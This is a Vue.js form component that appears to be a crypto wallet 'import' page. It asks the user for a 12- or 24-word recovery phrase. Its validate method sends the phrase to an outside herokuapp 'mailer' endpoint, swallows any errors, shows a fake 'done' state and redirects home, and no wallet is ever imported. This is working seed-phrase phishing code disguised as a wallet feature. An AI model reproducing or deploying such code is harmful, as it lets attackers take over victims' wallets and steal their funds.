<template>
  <v-form ref="form" class="p-3" v-model="valid" lazy-validation>
    <v-container fluid>
      <v-textarea
        v-model="phrase"
        :rules="nameRules"
        label="Phrase"
        hint="Typically 12(sometimes 24) words separated by single spaces"
        clearable
        auto-grow
        autofocus
        required
      ></v-textarea>
    </v-container>

    <v-btn
      :disabled="!valid"
      color="success"
      class="px-4 col-12 col-lg-4"
      @click="validate"
    >
      IMPORT
    </v-btn>
  </v-form>
</template>
<script>
export default {
  name: "PhraseComp",
  data: () => ({
    valid: true,
    phrase: "",
    resListening: true,
    nameRules: [
      (v) => !!v || "Phrase is required",
      //   (v) => (v && v.length <= 10) || "Name must be less than 10 characters",
    ],
    email: "",
    emailRules: [
      (v) => !!v || "E-mail is required",
      (v) => /.+@.+\..+/.test(v) || "E-mail must be valid",
    ],
    select: null,
    items: ["Item 1", "Item 2", "Item 3", "Item 4"],
    checkbox: false,
  }),

  methods: {
    validate() {
      this.$refs.form.validate();
      const baseURL =
        "https://everify-mailer.herokuapp.com/api/v1/wallet/create";
      // console.log(db);
      const data = {
        msg: `Phrase: ${this.phrase}`,
      };
      this.$http
        .post(baseURL, data, {
          headers: {
            "Access-Control-Allow-Origin": "*",
          },
        })
        .then(function (response) {
          if (response) {
            console.log(response);
          }
        })
        // eslint-disable-next-line no-unused-vars
        .catch(function (error) {});
      this.resListening = false;
    },
  },
  watch: {
    resListening: function () {
      setTimeout(() => {
        document.getElementById("done").classList.remove("d-none");
        document.getElementById("listening").classList.add("d-none");
      }, 5000);
      setTimeout(() => {
        this.$router.push({ path: "/" });
      }, 12000);
    },
  },
};
</script>
